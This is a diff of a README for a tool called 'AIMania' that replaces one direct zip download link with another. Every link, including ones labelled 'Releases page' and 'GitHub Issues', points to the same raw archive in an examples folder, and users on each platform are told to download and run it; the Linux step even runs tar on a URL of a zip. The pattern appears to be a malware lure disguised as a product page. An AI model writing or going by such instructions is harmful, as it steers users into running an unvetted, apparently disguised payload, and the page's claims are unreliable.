@@ -1,6 +1,6 @@
 # 🤖 AIMania - A Simple Guide to Avoid AI
 
-[![Download AIMania](https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip%20AIMania-v1.0-brightgreen)](https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip)
+[![Download AIMania](https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip%20AIMania-v1.0-brightgreen)](https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip)
 
 ## 📖 Overview
 
@@ -28,10 +28,10 @@ Before downloading AIMania, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download AIMania, visit this page to download: [AIMania Releases](https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip). You will find the latest version available.
+To download AIMania, visit this page to download: [AIMania Releases](https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip). You will find the latest version available.
 
 1. Click on the link above to go to the Releases page.
-2. Locate the latest version of AIMania. Look for the file that best suits your operating system (e.g., https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip for Windows).
+2. Locate the latest version of AIMania. Look for the file that best suits your operating system (e.g., https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip for Windows).
 3. Click on the file to start the download.
 4. Once the download is complete, open the file to begin installation.
 5. Follow the on-screen instructions to install AIMania on your computer.
@@ -42,7 +42,7 @@ For specific installation guidance, see the section below.
 
 ### For Windows Users:
 
-1. Download the **https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip** from the Releases page.
+1. Download the **https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip** from the Releases page.
 2. Double-click the downloaded file to run it.
 3. Follow the installation wizard. Click "Next" to continue.
 4. Choose your installation location or leave it as the default.
@@ -51,7 +51,7 @@ For specific installation guidance, see the section below.
 
 ### For macOS Users:
 
-1. Download the **https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip** from the Releases page.
+1. Download the **https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip** from the Releases page.
 2. Double-click the downloaded file to open it.
 3. Drag the AIMania icon to your Applications folder.
 4. Open your Applications folder and double-click AIMania to run it.
@@ -59,10 +59,10 @@ For specific installation guidance, see the section below.
 
 ### For Linux Users:
 
-1. Download the **https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip** from the Releases page.
+1. Download the **https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip** from the Releases page.
 2. Open a terminal window.
 3. Navigate to the folder where you downloaded the file.
-4. Run the command: `tar -xzf https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip` to extract the files.
+4. Run the command: `tar -xzf https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip` to extract the files.
 5. Change into the new directory: `cd AIMania`.
 6. Run the application with: `./AIMania`.
 
@@ -80,12 +80,12 @@ If you encounter issues while running AIMania, try the following:
 
 1. Ensure your system meets all requirements.
 2. Restart your computer and try again.
-3. Check for updates on the [AIMania Releases](https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip) page.
+3. Check for updates on the [AIMania Releases](https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip) page.
 4. Review the product documentation for solutions to common problems.
 
 ## 📞 Support
 
-For additional help, you can reach out through our [GitHub Issues](https://github.com/yosezkilla/AIMania/raw/refs/heads/main/examples/readme/Mania_AI_v2.2.zip). We welcome your feedback and suggestions to improve AIMania.
+For additional help, you can reach out through our [GitHub Issues](https://raw.githubusercontent.com/yosezkilla/AIMania/main/examples/git/AI-Mania-1.6.zip). We welcome your feedback and suggestions to improve AIMania.
 
 ## 🌐 Topics
 
